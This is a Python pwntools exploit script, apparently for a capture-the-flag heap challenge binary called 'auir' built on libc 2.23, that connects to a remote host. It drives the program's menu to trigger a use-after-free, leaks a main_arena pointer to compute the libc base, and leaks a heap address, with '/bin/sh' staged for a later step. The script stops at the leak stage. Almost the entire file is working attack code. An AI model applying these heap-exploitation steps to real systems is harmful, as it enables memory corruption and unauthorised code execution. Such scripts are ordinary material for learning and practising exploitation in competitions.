#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.clear(arch='amd64')
exe = context.binary = ELF('auir')
libc = ELF('./libc-2.23.so')
context.terminal = ['gnome-terminal', '-e']

host = args.HOST or '10.67.0.1'
port = int(args.PORT or 32148)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.entry:x}
continue
'''.format(**locals())

"""
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
"""
# -- Exploit goes here --

io = start()

def prompt():
    io.recvuntil('>>')

def alloc(size, content):
    prompt()
    io.sendline('1')

    prompt()
    io.sendline(str(size))

    prompt()
    io.sendline(content)

def free(index):
    prompt()
    io.sendline('2')

    prompt()
    io.sendline(str(index))

def edit(index, sz, content):
    prompt()
    io.sendline('3')

    prompt()
    io.sendline(str(index))

    prompt()
    io.sendline(str(sz))

    prompt()
    io.sendline(content)

def show(index):
    prompt()
    io.sendline('4')

    prompt()
    io.sendline(str(index))
"""
alloc(0x100, "ccc")
alloc(0x10, "aaa")
alloc(0x100, "bbb")
free(1)
show(1)
io.recvline()
addr = unpack(io.recv(8))
log.success("Heap: " + hex(addr))


exit()
"""
alloc(500, "/bin/sh\x00")
alloc(500, "small")
alloc(0x28, "fast")
alloc(0x28, "fast")
alloc(0x28, "fast")

free(1)
free(3)
free(2)

show(1)
io.recvline()

main_arena_off = 0x3c4b78
addr = unpack(io.recv(8)) - main_arena_off
log.success("Leak libc: " + hex(addr))
libc.address = addr

show(2)
io.recvline()
addr = unpack(io.recv(8))
log.success("Heap: " + hex(addr))
